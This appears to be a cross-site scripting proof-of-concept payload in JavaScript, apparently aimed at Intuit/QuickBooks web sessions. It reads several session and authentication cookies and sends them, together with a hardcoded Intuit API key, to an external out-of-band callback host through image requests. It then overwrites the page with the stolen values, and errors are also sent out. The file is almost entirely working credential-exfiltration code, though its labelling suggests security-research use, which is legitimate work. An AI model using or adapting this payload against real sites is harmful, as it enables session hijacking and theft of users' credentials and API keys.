(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
var ticket=gc('qbn.ticket');
var authid=gc('qbn.authid');
var agentid=gc('qbn.agentid');
var session=gc('ius_session');
var apikey='Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0';

new Image().src=O+'/cookies?ticket='+encodeURIComponent(ticket)+'&authid='+encodeURIComponent(authid)+'&agentid='+encodeURIComponent(agentid)+'&session='+encodeURIComponent(session);
new Image().src=O+'/apikey?k='+encodeURIComponent(apikey);

if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'
+'[*] XSS Credential Exfiltration PoC\n'
+'[*] Origin: '+location.origin+'\n\n'
+'Stolen cookies (sent to attacker OAST):\n'
+'  qbn.ticket='+ticket+'\n'
+'  qbn.authid='+authid+'\n'
+'  qbn.agentid='+agentid+'\n'
+'  ius_session='+session+'\n\n'
+'Stolen API key (sent to attacker OAST):\n'
+'  Authorization: '+apikey+'\n'
+'</pre>';
}catch(e){
new Image().src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p45-err?e='+encodeURIComponent(e.message);
}
})();
